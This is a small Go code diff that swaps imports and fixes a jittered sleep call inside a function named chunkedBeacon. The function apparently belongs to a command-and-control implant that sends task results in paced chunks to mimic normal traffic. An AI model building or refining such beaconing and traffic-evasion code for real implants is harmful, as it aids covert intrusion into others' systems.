@@ -7,12 +7,12 @@ import (
 	"crypto/cipher"
 	"crypto/rand"
 	"crypto/sha256"
-	"crypto/tls"
 	"crypto/x509"
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/json"
 	"fmt"
+	mrand "math/rand"
 	"io"
 	"io/ioutil"
 	"net"
@@ -519,7 +519,7 @@ func chunkedBeacon(results []TaskResult) error {
 			}
 		} else {
 			// Pacing: Micro-sleep between chunks to simulate TCP flow/App logic
-			time.Sleep(time.Millisecond * time.Duration(100+rand.Intn(400)))
+			time.Sleep(time.Millisecond * time.Duration(100+mrand.Intn(400)))
 		}
 	}
 	return nil
